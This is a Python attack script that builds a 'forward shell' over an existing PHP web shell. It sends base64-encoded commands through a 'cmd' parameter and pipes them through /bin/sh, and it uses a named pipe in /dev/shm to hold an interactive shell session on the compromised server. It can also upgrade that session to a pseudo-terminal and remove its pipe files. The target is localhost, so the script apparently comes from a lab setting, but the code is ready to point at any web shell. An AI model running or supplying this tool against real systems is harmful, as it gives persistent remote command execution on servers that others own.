#!/usr/bin/env python3

import requests
import time

from termcolor import colored
from base64 import b64encode
from random import randrange

class ForwardShell:

    def __init__(self):
        self.main_url = "http://localhost/index.php"
        session = randrange(1000, 9999)
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout = f"/dev/shm/{session}.output"
        self.is_pseudo_terminal = False

    def run_command(self, command):
        
        command = b64encode(command.encode()).decode()

        data = {
                'cmd': 'echo "%s" | base64 -d | /bin/sh' % command
        }

        try:
            r = requests.get(self.main_url, params=data, timeout=5)
            return r.text
        except:
            pass

        return None

    def remove_files(self):
        self.run_command(f"/bin/rm -f {self.stdin}")
        self.run_command(f"/bin/rm -f {self.stdout}")

    def read_output(self):

        for _ in range(5):
            output = self.run_command(f"cat {self.stdout}")
            time.sleep(0.2)
        
        return output

    def clear_output(self):
        self.run_command(f"echo '' > {self.stdout}")

    def set_command(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            'cmd' : 'echo "%s" | base64 -d > %s' % (command, self.stdin) 
        }

        r = requests.get(self.main_url, params=data)

        return self.read_output()

    def set_setup(self):
        setup_command = f'mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s' % (self.stdin, self.stdin, self.stdout)
        self.run_command(setup_command)

    def run(self):

        self.set_setup()

        while True:
            command = input(colored("> ", "yellow"))
            output = self.set_command(command + "\n")
            
            if command == "script /dev/null -c bash":
                self.is_pseudo_terminal = True

            if self.is_pseudo_terminal:
                output_list = output.split('\n')

                if len(output_list) == 2 or len(output_list) == 3:
                    cleared_output = '\n'.join([output_list[-1]])
                else:
                    pass

                print(cleared_output)
            else:
                print(output)

            self.clear_output()
